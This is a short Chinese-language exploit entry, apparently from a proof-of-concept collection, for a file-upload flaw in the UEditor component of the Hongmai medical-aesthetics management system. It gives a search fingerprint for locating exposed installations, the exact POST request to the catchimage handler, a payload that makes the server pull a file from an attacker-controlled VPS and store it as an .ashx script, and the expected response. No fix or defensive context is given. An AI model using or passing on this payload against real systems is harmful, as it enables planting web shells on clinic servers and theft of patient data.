# 宏脉医美行业管理系统UEditor编辑器存在文件上传漏洞

宏脉医美行业管理系统UEditor编辑器 ｜ 文件上传 ｜ —
- **指纹**：`title="宏脉医美行业管理系统"`
- **请求**：`POST /content/Js/ueditor/net/controller.ashx?action=catchimage HTTP/1.1`

**Payload**
```
source[]=http://vpsip/1.png?.ashx
```
- **响应特征**：200